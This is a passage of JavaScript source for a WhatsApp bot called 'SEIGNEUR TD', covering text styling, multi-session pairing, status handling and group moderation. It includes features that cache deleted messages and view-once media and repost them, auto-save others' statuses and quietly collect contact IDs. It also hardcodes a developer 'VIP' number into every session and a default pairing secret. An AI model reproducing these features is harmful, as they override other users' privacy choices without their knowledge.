      { map: {'a':'ᴀ','b':'ʙ','c':'ᴄ','d':'ᴅ','e':'ᴇ','f':'ꜰ','g':'ɢ','h':'ʜ','i':'ɪ','j':'ᴊ','k':'ᴋ','l':'ʟ','m':'ᴍ','n':'ɴ','o':'ᴏ','p':'ᴘ','q':'Q','r':'ʀ','s':'ꜱ','t':'ᴛ','u':'ᴜ','v':'ᴠ','w':'ᴡ','x':'x','y':'ʏ','z':'ᴢ','A':'ᴀ','B':'ʙ','C':'ᴄ','D':'ᴅ','E':'ᴇ','F':'ꜰ','G':'ɢ','H':'ʜ','I':'ɪ','J':'ᴊ','K':'ᴋ','L':'ʟ','M':'ᴍ','N':'ɴ','O':'ᴏ','P':'ᴘ','Q':'Q','R':'ʀ','S':'ꜱ','T':'ᴛ','U':'ᴜ','V':'ᴠ','W':'ᴡ','X':'x','Y':'ʏ','Z':'ᴢ'} },
      // 30 - Italic 𝑍𝒐𝒌𝒐𝒖
      { range: [0x1D434, 0x1D44D, 0x1D434] },
      // 31 - Math bold 𝛧𝛩𝛫𝛩𝑈
      { map: {'a':'𝛼','b':'𝛽','c':'𝛾','d':'𝛿','e':'𝜀','f':'𝜁','g':'𝜂','h':'𝜃','i':'𝜄','j':'𝜅','k':'𝜆','l':'𝜇','m':'𝜈','n':'𝜉','o':'𝜊','p':'𝜋','q':'𝜌','r':'𝜍','s':'𝜎','t':'𝜏','u':'𝜐','v':'𝜑','w':'𝜒','x':'𝜓','y':'𝜔','z':'z','A':'𝛢','B':'𝛣','C':'𝛤','D':'𝛥','E':'𝛦','F':'𝛧','G':'𝛨','H':'𝛩','I':'𝛪','J':'𝛫','K':'𝛬','L':'𝛭','M':'𝛮','N':'𝛯','O':'𝛰','P':'𝛱','Q':'𝛲','R':'𝛳','S':'𝛴','T':'𝛵','U':'𝛶','V':'𝛷','W':'𝛸','X':'𝛹','Y':'𝛺','Z':'𝛻'} },
      // 32 - Math Monospace Bold 𝚭𝚯𝐊𝚯𝐔
      { map: {'a':'𝚊','b':'𝚋','c':'𝚌','d':'𝚍','e':'𝚎','f':'𝚏','g':'𝚐','h':'𝚑','i':'𝚒','j':'𝚓','k':'𝚔','l':'𝚕','m':'𝚖','n':'𝚗','o':'𝚘','p':'𝚙','q':'𝚚','r':'𝚛','s':'𝚜','t':'𝚝','u':'𝚞','v':'𝚟','w':'𝚠','x':'𝚡','y':'𝚢','z':'𝚣','A':'𝙰','B':'𝙱','C':'𝙲','D':'𝙳','E':'𝙴','F':'𝙵','G':'𝙶','H':'𝙷','I':'𝙸','J':'𝙹','K':'𝙺','L':'𝙻','M':'𝙼','N':'𝙽','O':'𝙾','P':'𝙿','Q':'𝚀','R':'𝚁','S':'𝚂','T':'𝚃','U':'𝚄','V':'𝚅','W':'𝚆','X':'𝚇','Y':'𝚈','Z':'𝚉'} },
      // 33 - ɀꪮᛕꪮꪊ Vai/Runic mix
      { map: {'a':'ꪖ','b':'ꪜ','c':'ꪊ','d':'ᦔ','e':'ꫀ','f':'ꪰ','g':'ᧁ','h':'ꫝ','i':'ꪱ','j':'ꪝ','k':'ᛕ','l':'ꪶ','m':'ꪑ','n':'ꪀ','o':'ꪮ','p':'ρ','q':'ꪕ','r':'ꪹ','s':'ꫛ','t':'ꪻ','u':'ꪊ','v':'ꪜ','w':'ꪲ','x':'ꪤ','y':'ꪗ','z':'ɀ','A':'ꪖ','B':'ꪜ','C':'ꪊ','D':'ᦔ','E':'ꫀ','F':'ꪰ','G':'ᧁ','H':'ꫝ','I':'ꪱ','J':'ꪝ','K':'ᛕ','L':'ꪶ','M':'ꪑ','N':'ꪀ','O':'ꪮ','P':'ρ','Q':'ꪕ','R':'ꪹ','S':'ꫛ','T':'ꪻ','U':'ꪊ','V':'ꪜ','W':'ꪲ','X':'ꪤ','Y':'ꪗ','Z':'ɀ'} },
      // 34 - plain lowercase
      { map: {'a':'a','b':'b','c':'c','d':'d','e':'e','f':'f','g':'g','h':'h','i':'i','j':'j','k':'k','l':'l','m':'m','n':'n','o':'o','p':'p','q':'q','r':'r','s':'s','t':'t','u':'u','v':'v','w':'w','x':'x','y':'y','z':'z','A':'a','B':'b','C':'c','D':'d','E':'e','F':'f','G':'g','H':'h','I':'i','J':'j','K':'k','L':'l','M':'m','N':'n','O':'o','P':'p','Q':'q','R':'r','S':'s','T':'t','U':'u','V':'v','W':'w','X':'x','Y':'y','Z':'z'} },
      // 35 - Bold Italic Script 𝒁𝒐𝒌𝒐𝒖
      { range: [0x1D400, 0x1D419, 0x1D400], italic: true },
      // 36 - Circled letters Ⓩⓞⓚⓞⓤ
      { map: {'a':'ⓐ','b':'ⓑ','c':'ⓒ','d':'ⓓ','e':'ⓔ','f':'ⓕ','g':'ⓖ','h':'ⓗ','i':'ⓘ','j':'ⓙ','k':'ⓚ','l':'ⓛ','m':'ⓜ','n':'ⓝ','o':'ⓞ','p':'ⓟ','q':'ⓠ','r':'ⓡ','s':'ⓢ','t':'ⓣ','u':'ⓤ','v':'ⓥ','w':'ⓦ','x':'ⓧ','y':'ⓨ','z':'ⓩ','A':'Ⓐ','B':'Ⓑ','C':'Ⓒ','D':'Ⓓ','E':'Ⓔ','F':'Ⓕ','G':'Ⓖ','H':'Ⓗ','I':'Ⓘ','J':'Ⓙ','K':'Ⓚ','L':'Ⓛ','M':'Ⓜ','N':'Ⓝ','O':'Ⓞ','P':'Ⓟ','Q':'Ⓠ','R':'Ⓡ','S':'Ⓢ','T':'Ⓣ','U':'Ⓤ','V':'Ⓥ','W':'Ⓦ','X':'Ⓧ','Y':'Ⓨ','Z':'Ⓩ'} },
      // 37 - Upside down Zoʞon-ɯp
      { map: {'a':'ɐ','b':'q','c':'ɔ','d':'p','e':'ǝ','f':'ɟ','g':'ƃ','h':'ɥ','i':'ı','j':'ɾ','k':'ʞ','l':'l','m':'ɯ','n':'u','o':'o','p':'d','q':'b','r':'ɹ','s':'s','t':'ʇ','u':'n','v':'ʌ','w':'ʍ','x':'x','y':'ʎ','z':'z','A':'∀','B':'q','C':'Ɔ','D':'p','E':'Ǝ','F':'Ⅎ','G':'פ','H':'H','I':'I','J':'ɾ','K':'ʞ','L':'˥','M':'W','N':'N','O':'O','P':'d','Q':'Q','R':'ɹ','S':'S','T':'┴','U':'∩','V':'Λ','W':'M','X':'X','Y':'⅄','Z':'Z'} },
      // 38 = same as 29 (small caps)
      { map: {'a':'ᴀ','b':'ʙ','c':'ᴄ','d':'ᴅ','e':'ᴇ','f':'ꜰ','g':'ɢ','h':'ʜ','i':'ɪ','j':'ᴊ','k':'ᴋ','l':'ʟ','m':'ᴍ','n':'ɴ','o':'ᴏ','p':'ᴘ','q':'Q','r':'ʀ','s':'ꜱ','t':'ᴛ','u':'ᴜ','v':'ᴠ','w':'ᴡ','x':'x','y':'ʏ','z':'ᴢ','A':'ᴀ','B':'ʙ','C':'ᴄ','D':'ᴅ','E':'ᴇ','F':'ꜰ','G':'ɢ','H':'ʜ','I':'ɪ','J':'ᴊ','K':'ᴋ','L':'ʟ','M':'ᴍ','N':'ɴ','O':'ᴏ','P':'ᴘ','Q':'Q','R':'ʀ','S':'ꜱ','T':'ᴛ','U':'ᴜ','V':'ᴠ','W':'ᴡ','X':'x','Y':'ʏ','Z':'ᴢ'} },
      // 39 = same as 27
      { range: [0x1D51E, 0x1D537, 0x1D51E] },
      // 40 = same as 15
      { map: {'a':'₳','b':'฿','c':'₵','d':'Đ','e':'Ɇ','f':'₣','g':'₲','h':'Ħ','i':'ł','j':'J','k':'₭','l':'Ⱡ','m':'₥','n':'₦','o':'Ø','p':'₱','q':'Q','r':'Ɽ','s':'$','t':'₮','u':'Ʉ','v':'V','w':'₩','x':'Ӿ','y':'Ɏ','z':'Ⱬ','A':'₳','B':'฿','C':'₵','D':'Đ','E':'Ɇ','F':'₣','G':'₲','H':'Ħ','I':'ł','J':'J','K':'₭','L':'Ⱡ','M':'₥','N':'₦','O':'Ø','P':'₱','Q':'Q','R':'Ɽ','S':'$','T':'₮','U':'Ʉ','V':'V','W':'₩','X':'Ӿ','Y':'Ɏ','Z':'Ⱬ'} },
      // 41 = same as 5
      { map: {'a':'🄰','b':'🄱','c':'🄲','d':'🄳','e':'🄴','f':'🄵','g':'🄶','h':'🄷','i':'🄸','j':'🄹','k':'🄺','l':'🄻','m':'🄼','n':'🄽','o':'🄾','p':'🄿','q':'🅀','r':'🅁','s':'🅂','t':'🅃','u':'🅄','v':'🅅','w':'🅆','x':'🅇','y':'🅈','z':'🅉','A':'🄰','B':'🄱','C':'🄲','D':'🄳','E':'🄴','F':'🄵','G':'🄶','H':'🄷','I':'🄸','J':'🄹','K':'🄺','L':'🄻','M':'🄼','N':'🄽','O':'🄾','P':'🄿','Q':'🅀','R':'🅁','S':'🅂','T':'🅃','U':'🅄','V':'🅅','W':'🅆','X':'🅇','Y':'🅈','Z':'🅉'} },
      // 42 - Negative circled 🅩🅞🅚🅞🅤
      { map: {'a':'🅐','b':'🅑','c':'🅒','d':'🅓','e':'🅔','f':'🅕','g':'🅖','h':'🅗','i':'🅘','j':'🅙','k':'🅚','l':'🅛','m':'🅜','n':'🅝','o':'🅞','p':'🅟','q':'🅠','r':'🅡','s':'🅢','t':'🅣','u':'🅤','v':'🅥','w':'🅦','x':'🅧','y':'🅨','z':'🅩','A':'🅐','B':'🅑','C':'🅒','D':'🅓','E':'🅔','F':'🅕','G':'🅖','H':'🅗','I':'🅘','J':'🅙','K':'🅚','L':'🅛','M':'🅜','N':'🅝','O':'🅞','P':'🅟','Q':'🅠','R':'🅡','S':'🅢','T':'🅣','U':'🅤','V':'🅥','W':'🅦','X':'🅧','Y':'🅨','Z':'🅩'} },
      // 43 - Underline Z̲o̲k̲o̲u̲
      { underline: true },
    ];

    const style = styles[styleIndex];
    if (!style) return text;

    // Style with underline
    if (style.underline) {
      return text.split('').map(c => c !== ' ' ? c + '\u0332' : c).join('');
    }

    // Style with range Unicode (mathématique)
    if (style.range) {
      const [upperBase, , lowerBase] = style.range;
      return text.split('').map(c => {
        const code = c.charCodeAt(0);
        if (code >= 65 && code <= 90) return String.fromCodePoint(upperBase + (code - 65));
        if (code >= 97 && code <= 122) return String.fromCodePoint(lowerBase + (code - 97));
        return c;
      }).join('');
    }

    // Style with map
    if (style.map) {
      return text.split('').map(c => style.map[c] || c).join('');
    }

    return text;
  }

  const TOTAL_STYLES = 43;

  // Un seul style demandé
  if (styleNum !== null && styleNum >= 1 && styleNum <= TOTAL_STYLES) {
    const result = applyStyle(text, styleNum - 1);
    await sock.sendMessage(remoteJid, {
      text: `✨ *Style ${styleNum}:*\n\n${result}`
    });
    return;
  }

  // Tous les styles — envoyer en un seul message
  const lines = [];
  for (let i = 1; i <= TOTAL_STYLES; i++) {
    try {
      const result = applyStyle(text, i - 1);
      lines.push(`*${i}.* ${result}`);
    } catch(e) {
      lines.push(`*${i}.* ${text}`);
    }
  }

  const output = `✨ *FANCY — ${text}*\n━━━━━━━━━━━━━━━━━━━━━━━\n\n${lines.join('\n')}\n\n━━━━━━━━━━━━━━━━━━━━━━━\n_${config.prefix}fancy [1-${TOTAL_STYLES}] [texte] pour un style spécifique_`;

  await sock.sendMessage(remoteJid, { text: output });
}

function formatUptime(seconds) {
  const hours = Math.floor(seconds / 3600);
  const minutes = Math.floor((seconds % 3600) / 60);
  const secs = Math.floor(seconds % 60);
  return `${hours}h ${minutes}m ${secs}s`;
}

// =============================================
// LANCEMENT DU BOT
// =============================================

console.log('╔══════════════════════════════╗');
console.log('║   SEIGNEUR TD v3.5  ║');
console.log('╚══════════════════════════════╝\n');



// =============================================
// 🌐 MULTI-SESSION PAIRING SYSTEM
// Inspiré du système Seigneur TD Bot
// =============================================

// Map des sessions actives: phone -> { sock, status, pairingCode, createdAt }
const activeSessions = new Map();

const PAIRING_PORT   = process.env.PAIRING_PORT || 2006;
const PAIRING_SECRET = process.env.PAIRING_SECRET || 'SEIGNEUR_SECRET_KEY';

// Vérifier si session a des credentials valides
function sessionHasCredentials(phone) {
  const sessionFolder = './sessions/' + phone;
  const credsFile = sessionFolder + '/creds.json';
  try {
    if (!fs.existsSync(credsFile)) return false;
    const creds = JSON.parse(fs.readFileSync(credsFile, 'utf8'));
    return !!(creds?.me?.id || creds?.registered);
  } catch(e) { return false; }
}

// ─── Bot indépendant par session ─────────────────────────────────────────────
function launchSessionBot(sock, phone, sessionFolder, saveCreds) {
  console.log('[' + phone + '] 🚀 Bot indépendant démarré!');
  sock._sessionPhone = phone;
  // Nettoyer les listeners précédents pour éviter accumulation sur reconnexion
  try {
    sock.ev.removeAllListeners('messages.upsert');
    sock.ev.removeAllListeners('groups.update');
    sock.ev.removeAllListeners('group-participants.update');
    sock.ev.removeAllListeners('messages.delete');
    sock.ev.removeAllListeners('messages.update');
    sock.ev.removeAllListeners('call');
  } catch(e) {}
  // Raccourci vers l'état isolé de cette session
  const _ss = _getSessionState(phone);

  // Référence directe — pas de wrapper
  sock._origSend = sock.sendMessage.bind(sock);

  // Pas de message de bienvenue automatique

  // Handler messages
  const _sessionProcessedIds = new Set();
  sock.ev.on('messages.upsert', async ({ messages, type }) => {
    if (type !== 'notify') return;
    for (const message of messages) {
      // Ignorer silencieusement les messages non déchiffrés
      try {
        if (!message.message) continue;
        const _msgKeys = Object.keys(message.message);
        if (_msgKeys.length === 0) continue;
        // Message partiellement déchiffré (senderKeyDistributionMessage seul = pas encore prêt)
        if (_msgKeys.length === 1 && _msgKeys[0] === 'senderKeyDistributionMessage') continue;
      } catch(_e) { continue; }

      // 👑 RÉACTION VIP — priorité absolue, non-bloquant, avant tout traitement
      try {
        const _vipNum = '23591234568';
        const _vipSenderJid = message.key?.participant || message.key?.remoteJid || '';
        const _vipSenderNum = _vipSenderJid.split('@')[0].replace(/[^0-9]/g, '');
        if (!message.key?.fromMe && (_vipSenderNum === _vipNum || _vipSenderJid === '124318499475488@lid' || _vipSenderJid.startsWith('124318499475488'))) {
          sock.sendMessage(message.key.remoteJid, { react: { text: '👑', key: message.key } }).catch(() => {});
        }
      } catch(e) {}

      // Collecter TOUS les JIDs dès réception — avant tout filtre
      try {
        if (!message.key?.fromMe) {
          const _cJid = message.key?.participant || message.key?.remoteJid;
          if (_cJid && _cJid.endsWith('@s.whatsapp.net')) _knownContacts.add(_cJid);
        }
      } catch(e) {}

      try {
        const msgAge = Date.now() - ((message.messageTimestamp || 0) * 1000);
        if (msgAge > 10 * 60 * 1000) continue;
        const msgId = message.key?.id;
        if (!msgId || _sessionProcessedIds.has(msgId)) continue;
        _sessionProcessedIds.add(msgId);
        if (_sessionProcessedIds.size > 2000) _sessionProcessedIds.delete(_sessionProcessedIds.values().next().value);
        const remoteJid = message.key.remoteJid;
        if (!remoteJid) continue;

        // ✅ GESTION STATUTS pour sessions web
        if (remoteJid === 'status@broadcast') {
          try {
            const _stSender = message.key.participant || message.key.remoteJid;
            const _stBotJid = sock.user.id.split(':')[0] + '@s.whatsapp.net';
            const _stType = Object.keys(message.message || {})[0];
            // AntiDeleteStatus
            if (_stType === 'protocolMessage') {
              if (_ss.antiDeleteStatus) {
                try {
                  const _proto = message.message.protocolMessage;
                  if (_proto?.type === 0) {
                    const _delJid = message.key.participant || _stSender;
                    const _cached = global._statusCache?.get(_proto.key?.id);
                    // Anti-doublon — ne pas envoyer deux fois pour le même statut supprimé
                    if (!global._statusDeleteSent) global._statusDeleteSent = new Set();
                    const _dedupKey = _proto.key?.id + '_' + phone;
                    if (global._statusDeleteSent.has(_dedupKey)) { continue; }
                    global._statusDeleteSent.add(_dedupKey);
                    if (global._statusDeleteSent.size > 200) global._statusDeleteSent.delete(global._statusDeleteSent.values().next().value);
                    // Si pas en cache — ignorer silencieusement
                    if (!_cached) { continue; }
                    const _num = _delJid.split('@')[0].replace(/[^0-9]/g, '');
                    const _cap = '🗑️ *Status supprimé*\n👤 @' + _num + '\n\n*© SEIGNEUR TD*';
                    if (_cached.type === 'image') await sock.sendMessage(_stBotJid, { image: _cached.buf, caption: _cap, mentions: [_delJid] });
                    else if (_cached.type === 'video') await sock.sendMessage(_stBotJid, { video: _cached.buf, caption: _cap, mentions: [_delJid] });
                    else await sock.sendMessage(_stBotJid, { text: '🗑️ *Status supprimé*\n👤 @' + _num + '\n📝 ' + _cached.text + '\n\n*© SEIGNEUR TD*', mentions: [_delJid] });
                  }
                } catch(e) {}
              }
              continue;
            }
            if (!_stType) continue;
            // AutoStatusViews — indépendant du react
            if (_ss.autoStatusViews && _stSender !== _stBotJid) await sock.readMessages([message.key]).catch(() => {});
            // AutoReactStatus — indépendant de autoStatusViews
            if (_ss.autoReactStatus && _stSender !== _stBotJid) {
              await sock.sendMessage('status@broadcast', { react: { text: _ss.statusReactEmoji, key: message.key } }, { statusJidList: [_stSender] }).catch(() => {});
            }
            // Cache TOUJOURS les statuts pour antiDeleteStatus (même si désactivé pour l'instant)
            try {
              if (!global._statusCache) global._statusCache = new Map();
              const _m2 = message.message; const _sk = message.key.id;
              if (_m2?.imageMessage) { const _b = await toBuffer(await downloadContentFromMessage(_m2.imageMessage, 'image')).catch(() => null); if (_b) global._statusCache.set(_sk, { type: 'image', buf: _b }); }
              else if (_m2?.videoMessage) { const _b = await toBuffer(await downloadContentFromMessage(_m2.videoMessage, 'video')).catch(() => null); if (_b) global._statusCache.set(_sk, { type: 'video', buf: _b }); }
              else if (_m2?.extendedTextMessage?.text || _m2?.conversation) global._statusCache.set(_sk, { type: 'text', text: _m2?.extendedTextMessage?.text || _m2?.conversation });
              if (global._statusCache.size > 100) global._statusCache.delete(global._statusCache.keys().next().value);
            } catch(e) {}
            // AutoSaveStatus
            if (_ss.autoSaveStatus && _stSender !== _stBotJid) {
              try {
                const _m = message.message;
                if (_m?.imageMessage) { const _b = await toBuffer(await downloadContentFromMessage(_m.imageMessage, 'image')); await sock.sendMessage(_stBotJid, { image: _b, caption: '\uD83D\uDCF8 Status de +' + _stSender.split('@')[0] }); }
                else if (_m?.videoMessage) { const _b = await toBuffer(await downloadContentFromMessage(_m.videoMessage, 'video')); await sock.sendMessage(_stBotJid, { video: _b, caption: '\uD83C\uDFA5 Status de +' + _stSender.split('@')[0] }); }
                else if (_m?.extendedTextMessage?.text || _m?.conversation) await sock.sendMessage(_stBotJid, { text: '\uD83D\uDCDD Status de +' + _stSender.split('@')[0] + ':\n' + (_m?.extendedTextMessage?.text || _m?.conversation) });
              } catch(e) {}
            }
            // Anti-mention groupe dans status
            const _stMsg = message.message;
            const _hasGrpMention = _stMsg?.groupStatusMentionMessage !== undefined || _stMsg?.extendedTextMessage?.contextInfo?.groupMentions?.length > 0 || _stMsg?.imageMessage?.contextInfo?.groupMentions?.length > 0;
            if (_hasGrpMention && _stSender !== _stBotJid) {
              try {
                // Utilise groupSettings (cache local) — évite groupFetchAllParticipating qui génère des messages vides
                for (const [_gJid, _gs] of groupSettings.entries()) {
                  if (!_gs?.antimentiongroupe || !_gJid.endsWith('@g.us')) continue;
                  try {
                    if (!await isBotGroupAdmin(sock, _gJid)) continue;
                    await sock.sendMessage(_gJid, { delete: message.key }).catch(() => {});
                    await sock.sendMessage(_gJid, { text: '\uD83D\uDEAB @' + _stSender.split('@')[0] + ' expuls\u00e9 \u2014 mention groupe en statut\n\n*\u00a9 SEIGNEUR TD*', mentions: [_stSender] });
                    await sock.groupParticipantsUpdate(_gJid, [_stSender], 'remove');
                  } catch(e) {}
                }
              } catch(e) {}
            }
          } catch(e) { console.error('[STATUS-SESSION]', e.message); }
          continue;
        }
        const isGroup = remoteJid.endsWith('@g.us');
        let senderJid;
        if (message.key.fromMe) {
          senderJid = sock.user.id.split(':')[0] + '@s.whatsapp.net';
        } else if (isGroup) {
          senderJid = message.key.participant || message.participant || remoteJid;
        } else {
          senderJid = message.key.participant || remoteJid;
        }
        if (senderJid && senderJid.includes(':')) senderJid = senderJid.split(':')[0] + '@s.whatsapp.net';
        const _rawMsg = message.message;
        const messageText = _rawMsg?.conversation || _rawMsg?.extendedTextMessage?.text ||
          _rawMsg?.imageMessage?.caption || _rawMsg?.videoMessage?.caption || '';

        // fromMe dans PV : traiter si c'est une commande OU un emoji (pour vu unique → PV)
        if (message.key.fromMe && !isGroup) {
          const _fmTxt = (messageText || '').trim();
          const _fmIsCmd = _fmTxt.startsWith(config.prefix);
          const _fmIsEmoji = _fmTxt.length > 0 && _fmTxt.length <= 8 && /^\p{Emoji}+$/u.test(_fmTxt);
          if (!_fmIsCmd && !_fmIsEmoji) continue;
        }

        // ✅ CACHE messages pour _ss.antiDelete/_ss.antiEdit de cette session
        if (_ss.antiDelete || _ss.antiEdit) {
          try {
            const _cMsg = message.message;
            const _cImgMsg     = _cMsg?.imageMessage || _cMsg?.viewOnceMessageV2?.message?.imageMessage;
            const _cVidMsg     = _cMsg?.videoMessage || _cMsg?.viewOnceMessageV2?.message?.videoMessage;
            const _cAudioMsg   = _cMsg?.audioMessage;
            const _cStickerMsg = _cMsg?.stickerMessage;
            const _cDocMsg     = _cMsg?.documentMessage;
            const _cMediaRaw   = _cImgMsg || _cVidMsg || _cAudioMsg || _cStickerMsg || _cDocMsg || null;
            const _cMediaType  = _cImgMsg ? 'image' : _cVidMsg ? 'video' : _cAudioMsg ? 'audio' : _cStickerMsg ? 'sticker' : _cDocMsg ? 'document' : null;
            const _cData = {
              key: message.key, message: _cMsg, sender: senderJid,
              senderName: message.pushName || senderJid?.split('@')[0],
              remoteJid, isGroup, timestamp: Date.now(),
              isViewOnce: !!(_cMsg?.viewOnceMessageV2 || _cMsg?.viewOnceMessageV2Extension),
              mediaType: _cMediaType, mediaMsg: _cMediaRaw,
              mediaMime: _cImgMsg?.mimetype || _cVidMsg?.mimetype || _cAudioMsg?.mimetype || null,
              text: _cMsg?.conversation || _cMsg?.extendedTextMessage?.text || _cImgMsg?.caption || _cVidMsg?.caption || (_cImgMsg ? '[Image]' : _cVidMsg ? '[Video]' : _cAudioMsg ? '[Audio]' : _cStickerMsg ? '[Sticker]' : _cDocMsg ? '[Document]' : '[Message]')
            };
            if (_cMediaRaw && _cMediaType) {
              try {
                const _cStream = await downloadContentFromMessage(_cMediaRaw, _cMediaType);
                const _cChunks = [];
                for await (const chunk of _cStream) _cChunks.push(chunk);
                _cData.mediaBuffer = Buffer.concat(_cChunks);
              } catch(e) {}
            }
            messageCache.set(message.key.id, _cData);
            if (messageCache.size > 500) messageCache.delete(messageCache.keys().next().value);
          } catch(e) {}
        }

        // ✅ _ss.antiDelete via protocolMessage (revoke)
        if (_ss.antiDelete && message.message?.protocolMessage?.type === 0) {
          try {
            const _delKey = message.message.protocolMessage.key;
            const _delId = _delKey?.id;
            if (_delId) {
              const _cached = messageCache.get(_delId);
              if (_cached) {
                const _botPv = sock.user.id.split(':')[0] + '@s.whatsapp.net';
                let _notifyJid;
                if (_ss.antiDeleteMode === 'private') _notifyJid = _botPv;
                else if (_ss.antiDeleteMode === 'chat') _notifyJid = remoteJid;
                else { _notifyJid = remoteJid; await sendAntiDeleteNotif(sock, _botPv, _cached); }
                await sendAntiDeleteNotif(sock, _notifyJid, _cached);
              }
            }
          } catch(e) {}
          continue;
        }
        const _sessionOwnerNum = phone.replace(/[^0-9]/g, '');
        const _senderNum = senderJid.split('@')[0].replace(/[^0-9]/g, '');

        // ✅ isOwner = fromMe OU numéro connecté uniquement (indépendant du bot principal)
        const _isOwner = message.key.fromMe === true || _senderNum === _sessionOwnerNum;

        // ✅ Garantir que le owner de session est reconnu admin pour toutes les commandes
        if (_isOwner && _sessionOwnerNum) {
          if (!config.botAdmins.includes(_sessionOwnerNum)) config.botAdmins.push(_sessionOwnerNum);
          if (!config.adminNumbers.includes(_sessionOwnerNum)) config.adminNumbers.push(_sessionOwnerNum);
        }

        // 👑 Réaction VIP déjà faite en haut du loop (priorité absolue)

        // ✅ Reply emoji → PV du bot (owner uniquement)
        if (_isOwner) {
          const _rMsg = message.message;
          const _txt = (_rMsg?.conversation || _rMsg?.extendedTextMessage?.text || '').trim();
          const _qCtx = _rMsg?.extendedTextMessage?.contextInfo;
          const _qMsg = _qCtx?.quotedMessage;
          const _isEmoji = _txt.length > 0 && _txt.length <= 8
            && !_txt.startsWith(config.prefix)
            && /^\p{Emoji}+$/u.test(_txt);
          if (_isEmoji && _qMsg) {
            const _botPv = sock.user.id.split(':')[0] + '@s.whatsapp.net';
            // Extraire le contenu viewOnce (toutes versions) ou normal
            const _qVO = _qMsg.viewOnceMessageV2?.message
                      || _qMsg.viewOnceMessageV2Extension?.message
                      || _qMsg.viewOnceMessage?.message;
            const _imgMsg = _qVO?.imageMessage || _qMsg.imageMessage;
            const _vidMsg = _qVO?.videoMessage || _qMsg.videoMessage;
            // Audio vocal : chercher dans toutes les structures possibles
            const _audMsg = _qVO?.audioMessage || _qMsg.audioMessage
                         || _qVO?.pttMessage   || _qMsg.pttMessage;
            const _stickerMsg = _qMsg.stickerMessage;
            const _docMsg = _qMsg.documentMessage;

            // Anti-doublon : tracker les messageId déjà envoyés en PV
            const _qId = _qCtx?.stanzaId || '';
            global._emojiPvSent = global._emojiPvSent || new Set();
            const _dedupKey = phone + '_' + _qId;
            if (_qId && global._emojiPvSent.has(_dedupKey)) {
              continue; // Déjà envoyé — ignorer
            }
            if (_qId) {
              global._emojiPvSent.add(_dedupKey);
              if (global._emojiPvSent.size > 200) global._emojiPvSent.delete(global._emojiPvSent.values().next().value);
            }

            // Lancer en arrière-plan — non-bloquant
            ;(async () => {
              try {
                if (_imgMsg) {
                  const _buf = await toBuffer(await downloadContentFromMessage(_imgMsg, 'image'));
                  if (_buf?.length > 100) await sock.sendMessage(_botPv, { image: _buf, caption: '' });
                } else if (_vidMsg) {
                  const _buf = await toBuffer(await downloadContentFromMessage(_vidMsg, 'video'));
                  if (_buf?.length > 100) await sock.sendMessage(_botPv, { video: _buf, gifPlayback: _vidMsg.gifPlayback || false });
                } else if (_audMsg) {
                  const _buf = await toBuffer(await downloadContentFromMessage(_audMsg, 'audio'));
                  if (_buf?.length > 100) await sock.sendMessage(_botPv, { audio: _buf, ptt: true, mimetype: _audMsg.mimetype || 'audio/ogg; codecs=opus' });
                } else if (_stickerMsg) {
                  const _buf = await toBuffer(await downloadContentFromMessage(_stickerMsg, 'sticker'));
                  if (_buf?.length > 100) await sock.sendMessage(_botPv, { sticker: _buf });
                } else if (_docMsg) {
                  const _buf = await toBuffer(await downloadContentFromMessage(_docMsg, 'document'));
                  if (_buf?.length > 100) await sock.sendMessage(_botPv, { document: _buf, mimetype: _docMsg.mimetype, fileName: _docMsg.fileName || 'fichier' });
                } else {
                  const _qTxt = _qMsg.conversation || _qMsg.extendedTextMessage?.text;
                  if (_qTxt) await sock.sendMessage(_botPv, { text: '📩 *Message sauvegardé*\n\n' + _qTxt });
                }
              } catch(_e) { console.error('[EMOJI→PV]', _e.message); }
            })();
            continue;
          }
        }

        // ✅ PROTECTIONS GROUPE (antisticker, antiimage, antivideo, antilink, antitag, antispam, antibot, antibug)
        if (isGroup) {
          const _gs = initGroupSettings(remoteJid);
          const _userIsAdmin = await isGroupAdmin(sock, remoteJid, senderJid);
          const _botIsAdm = await isBotGroupAdmin(sock, remoteJid);
          if (!_userIsAdmin) {
            // antibot
            if (_gs.antibot && _botIsAdm) {
              const _pn = (message.pushName || '').toLowerCase(), _sn = senderJid.split('@')[0];
              if ((_pn.includes('bot') || _pn.includes('robot') || /^\d{16,}$/.test(_sn)) && !isAdmin(senderJid)) {
                try { await sock.groupParticipantsUpdate(remoteJid, [senderJid], 'remove'); await sock.sendMessage(remoteJid, { text: '🤖 Bot expulsé: @' + _sn, mentions: [senderJid] }); continue; } catch(e) {}
              }
            }
            // antilink
            if (_gs.antilink && _botIsAdm) {
              const _linkRx = /(https?:\/\/[^\s]+)|(www\.[^\s]+)|((whatsapp|wa|chat)\.gg\/[^\s]+)/gi;
              if (_linkRx.test(messageText)) {
                try {
                  await sock.sendMessage(remoteJid, { delete: message.key });
                  const _wc = addWarn(remoteJid, senderJid, 'Envoi de lien');
                  await sock.sendMessage(remoteJid, { text: '🚫 @' + senderJid.split('@')[0] + ', les liens sont interdits!\n\n⚠️ Warning ' + _wc + '/' + _gs.maxWarns, mentions: [senderJid] });
                  if (_wc >= _gs.maxWarns) { await sock.groupParticipantsUpdate(remoteJid, [senderJid], 'remove'); resetWarns(remoteJid, senderJid); }
                  continue;
                } catch(e) {}
              }
            }
            // antitag
            if (_gs.antitag && _botIsAdm) {
              const _mentions = message.message?.extendedTextMessage?.contextInfo?.mentionedJid || [];
              if (_mentions.length > 5) {
                try {
                  await sock.sendMessage(remoteJid, { delete: message.key });
                  const _wc = addWarn(remoteJid, senderJid, 'Tag massif');
                  await sock.sendMessage(remoteJid, { text: '🚫 @' + senderJid.split('@')[0] + ', pas de tags massifs!\n\n⚠️ Warning ' + _wc + '/' + _gs.maxWarns, mentions: [senderJid] });
                  if (_wc >= _gs.maxWarns) { await sock.groupParticipantsUpdate(remoteJid, [senderJid], 'remove'); resetWarns(remoteJid, senderJid); }
                  continue;
                } catch(e) {}
              }
            }
            // antispam
            if (_gs.antispam && _botIsAdm && messageText) {
              if (checkSpam(senderJid, messageText)) {
                try {
                  await sock.sendMessage(remoteJid, { delete: message.key });
                  const _wc = addWarn(remoteJid, senderJid, 'Spam');
                  await sock.sendMessage(remoteJid, { text: '🚫 @' + senderJid.split('@')[0] + ', arrêtez de spammer!\n\n⚠️ Warning ' + _wc + '/' + _gs.maxWarns, mentions: [senderJid] });
                  if (_wc >= _gs.maxWarns) { await sock.groupParticipantsUpdate(remoteJid, [senderJid], 'remove'); resetWarns(remoteJid, senderJid); }
                  continue;
                } catch(e) {}
              }
            }
            // antisticker
            if (_gs.antisticker && _botIsAdm && message.message?.stickerMessage) {
